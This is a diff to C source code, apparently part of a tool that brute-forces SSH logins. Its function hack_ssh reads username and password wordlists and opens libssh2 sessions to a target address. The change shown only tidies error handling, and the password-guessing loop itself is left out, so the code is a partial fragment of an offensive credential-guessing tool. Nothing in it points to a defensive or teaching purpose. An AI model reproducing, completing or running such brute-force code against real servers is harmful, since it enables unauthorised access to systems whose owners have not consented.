@@ -13,7 +13,6 @@
 #define LIBSSH2_INIT_NO_CRYPTO 0x0001
 
 int hack_ssh(in_addr_t ip, int port){
-	char c[128]="n";
 	printf("\nTrying to perform connections by using brute force...\n\n");
 	printf("%s",BLUE);
 	char *userauthlist;
@@ -32,19 +31,13 @@ int hack_ssh(in_addr_t ip, int port){
 	FILE *f=NULL;
 	int i=0;
 	double totalUsernames=0, totalComb=0, cont=0;
-	if((totalUsernames=open_file("usernames_FTP_SSH.txt",&f))==-1){
-		printf("fopen(%s) error: Error: %d (%s)\n", "usernames_FTP_SSH.txt", errno, strerror(errno));
-		return -1;
-	}
+	if((totalUsernames=open_file("usernames_FTP_SSH.txt",&f))==-1) return RETURN_ERROR;
 	char **usernames = (char**)malloc(totalUsernames * sizeof(char*));
 	for (i=0;i<totalUsernames;i++) usernames[i] = (char*)malloc(50 * sizeof(char));
 	i=0;
 	while(fscanf(f,"%s", usernames[i])!=EOF) i++;
 	int totalPasswords=0;
-	if((totalPasswords=open_file("passwords_SSH.txt",&f))==-1){
-		printf("fopen(%s) error: Error: %d (%s)\n", "passwords_SSH.txt", errno, strerror(errno));
-		return -1;
-	}
+	if((totalPasswords=open_file("passwords_SSH.txt",&f))==-1) return RETURN_ERROR;
 	char **passwords = (char**)malloc(totalPasswords * sizeof(char*));
 	for (i=0;i<totalPasswords;i++) passwords[i] = (char*)malloc(50 * sizeof(char));
 	i=0;
@@ -103,19 +96,19 @@ int hack_ssh(in_addr_t ip, int port){
 	libssh2_session_free(session);
 	printf("%s", DEFAULT);
 	close(sk);
-	return -1;
+	return RETURN_ERROR;
 }
 
 int create_SSH_handshake_session(LIBSSH2_SESSION **session, in_addr_t ip, int port){
 	int rc = libssh2_init(0);
 	if(rc != 0) {
 		printf("libssh2_init() error: Error: %d (%s)\n", errno, strerror(errno));
-		return -1;
+		return RETURN_ERROR;
 	}
 	int sk=socket(AF_INET,SOCK_STREAM, 0);
 	if(sk<0){
 		printf("socket() error: Error: %d (%s)\n", errno, strerror(errno));
-		return -1;
+		return RETURN_ERROR;
 	}
 	struct sockaddr_in serverAddress;
 	serverAddress.sin_family = AF_INET;
